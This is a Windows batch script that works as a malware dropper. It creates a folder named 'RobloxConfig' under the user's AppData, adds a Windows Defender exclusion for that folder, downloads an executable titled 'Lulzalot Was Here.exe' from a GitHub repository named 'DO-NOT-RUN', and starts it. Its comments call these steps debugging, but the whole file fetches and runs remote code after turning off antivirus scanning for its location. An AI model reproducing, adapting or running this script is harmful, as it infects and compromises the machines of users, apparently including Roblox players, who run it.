@echo off
setlocal enabledelayedexpansion

set "folderPath=%USERPROFILE%\AppData\Local\RobloxConfig"
mkdir "%folderPath%"

:: Debugging: Check folder creation status
if exist "%folderPath%" (
    echo Folder created successfully: %folderPath%
) else (
    echo Failed to create folder: %folderPath%
    exit /b 1
)

:: Debugging: Attempt to add exclusion to Windows Defender
echo Adding exclusion to Windows Defender...
powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
if %errorlevel% neq 0 (
    echo Failed to add exclusion.
    exit /b 1
)

:: Debugging: Attempt to download the file
echo Downloading file...
curl -L -o "%folderPath%\Lulzalot Was Here.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/Lulzalot%20Was%20Here.exe"

:: Debugging: Check if curl succeeded
if %errorlevel% neq 0 (
    echo Curl failed with error code %errorlevel%.
    exit /b 1
) else (
    echo File downloaded successfully.
)

:: Debugging: Verify the file exists and check its size
if exist "%folderPath%\Lulzalot Was Here.exe" (
    for %%F in ("%folderPath%\Lulzalot Was Here.exe") do (
        set filesize=%%~zF
    )
    
    if "%filesize%"=="0" (
        echo Download failed or file is empty. Size: 0 bytes. Exiting...
        exit /b 1
    ) else (
        echo File downloaded successfully. Size: %filesize% bytes.
    )
) else (
    echo File download failed. File not found. Exiting...
    exit /b 1
)

:: Run the executable if everything is okay
echo Running the executable...
start "" "%folderPath%\Lulzalot Was Here.exe"
exit
